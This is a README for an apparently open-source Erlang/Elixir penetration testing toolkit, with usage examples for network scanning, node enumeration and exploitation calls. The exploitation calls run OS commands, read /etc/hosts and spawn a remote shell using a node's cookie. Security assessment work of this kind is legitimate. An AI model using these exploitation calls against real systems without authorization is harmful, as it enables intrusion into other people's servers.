# Jæger

> *Jæger* — Norwegian for "hunter." In Norse myth, the hunter stalks what others cannot see. In distributed systems, so must we.

Erlang/Elixir node discovery and penetration testing toolkit.

## Features

- **Discovery**: EPMD scanning and node enumeration
- **Fingerprinting**: System info and version detection
- **Vulnerability Scanning**: Security misconfiguration detection
- **Exploitation**: RCE and post-exploitation capabilities

## Build

```bash
rebar3 escriptize
```

## Quick Start

```bash
# Start a test node
erl -sname myapp -setcookie secret123

# Scan for it
./_build/default/bin/jeger -r 127.0.0.1-1

# Scan network range with custom timeout and concurrency
./_build/default/bin/jeger -r 192.168.1.1-254 -t 2000 -c 100
```

Common targets: Phoenix/Elixir apps, RabbitMQ, CouchDB, ejabberd

## API Usage

```erlang
% Start shell
rebar3 shell

% Discovery
{ok, Hosts} = jeger_discovery:discover({"192.168.1.", 1, 254}, #{timeout => 2000, verbose => true}).

% Enumeration
{ok, Info} = jeger_enum:enumerate_node("192.168.1.5", "myapp", secret).

% Vulnerability scanning
{ok, Findings} = jeger_scan:scan_node("192.168.1.5", "myapp", secret).

% Exploitation
{ok, Result} = jeger_exploit:execute_command("192.168.1.5", "myapp", secret, "os:cmd(\"whoami\")").
{ok, Content} = jeger_exploit:read_file("192.168.1.5", "myapp", secret, "/etc/hosts").
{ok, Pid} = jeger_exploit:spawn_shell("192.168.1.5", "myapp", secret).
```

## Testing

```bash
rebar3 eunit
```

## Warning

**For authorized security assessments only.** Unauthorized access is illegal.

## License

Apache-2.0
